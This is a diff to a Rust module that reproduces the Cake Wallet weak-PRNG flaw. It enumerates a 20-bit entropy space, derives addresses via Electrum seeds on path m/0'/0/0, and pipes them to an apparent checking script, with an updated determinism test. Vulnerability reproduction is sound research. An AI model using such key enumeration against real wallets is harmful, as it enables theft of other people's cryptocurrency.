@@ -14,9 +14,11 @@ use std::str::FromStr;
 
 /// Simulates the Cake Wallet vulnerability by generating wallets from a limited entropy source.
 /// The vulnerability was due to a weak PRNG with effectively 20 bits of entropy.
+/// Cake Wallet uses Electrum seed format with derivation path m/0'/0/0.
 /// We will simulate this by iterating through a subset of this space.
 pub fn run() -> Result<()> {
     eprintln!("Reproducing Cake Wallet Vulnerability (Weak PRNG)...");
+    eprintln!("Using Electrum seed format with m/0'/0/0 derivation path...");
     eprintln!("Simulating 20-bit entropy search...");
 
     // 20 bits = 1,048,576 possibilities
@@ -47,8 +49,9 @@ pub fn run() -> Result<()> {
         batch.push(entropy);
 
         if batch.len() >= 1024 || i == max_entropy - 1 {
-            // Compute Cake Wallet addresses (purpose=0 for m/0'/0/0)
-            if let Ok(addresses) = solver.compute_batch(&batch, 0) {
+            // Compute Cake Wallet addresses using Electrum seed derivation
+            // purpose=0 for m/0'/0/0 (Electrum path for Cake Wallet)
+            if let Ok(addresses) = solver.compute_batch_electrum(&batch, 0) {
                 for addr in addresses.iter() {
                     // Output for pipe to check_mnemonics.py
                     // Format: ADDRESS: <hex>
@@ -85,15 +88,21 @@ mod tests {
     fn test_weak_prng_reproducibility() {
         // Verify that seed index 0 always produces the same address
         // This confirms our "weak PRNG" simulation is deterministic
+        // Using Electrum seed derivation (PBKDF2 with "electrum" salt)
         let i = 0;
         let mut entropy = [0u8; 32];
         entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());
 
         let mnemonic = Mnemonic::from_entropy(&entropy[0..16]).unwrap();
-        let seed = mnemonic.to_seed("");
+        
+        // Use Electrum seed derivation
+        let seed = crate::electrum_mnemonic::mnemonic_to_electrum_seed(&mnemonic, "");
+        
         let network = Network::Bitcoin;
         let secp = Secp256k1::new();
         let root = Xpriv::new_master(network, &seed).unwrap();
+        
+        // Electrum path for Cake Wallet: m/0'/0/0
         let path = DerivationPath::from_str("m/0'/0/0").unwrap();
         let child = root.derive_priv(&secp, &path).unwrap();
         let pubkey = child.to_keypair(&secp).public_key();
